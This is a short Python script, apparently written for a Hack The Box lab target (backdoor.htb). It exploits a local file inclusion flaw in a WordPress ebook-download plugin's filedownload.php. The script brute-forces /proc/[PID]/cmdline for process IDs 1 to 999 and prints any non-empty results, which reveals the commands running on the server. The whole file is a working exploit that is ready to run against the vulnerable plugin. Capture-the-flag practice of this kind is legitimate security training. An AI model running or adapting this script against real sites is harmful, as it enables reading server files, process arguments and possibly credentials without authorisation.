#!/usr/bin/python3


'''
This script aims to brute-force a site through LFI (Local File inclusion)
The path to bruteforce is /proc/[PID]/cmdline
'''


import requests
import re

url = "http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/"

for i in range (1, 1000):
    trial = url + str(i) + "/cmdline"
    response = requests.get(trial)
    response_length = len(response.content)

    if (response_length > 82):
        print("URL: " + trial + "\n")
        print(re.split("/cmdline/", str(response.content)))

        print ("\n-----------------------------------")


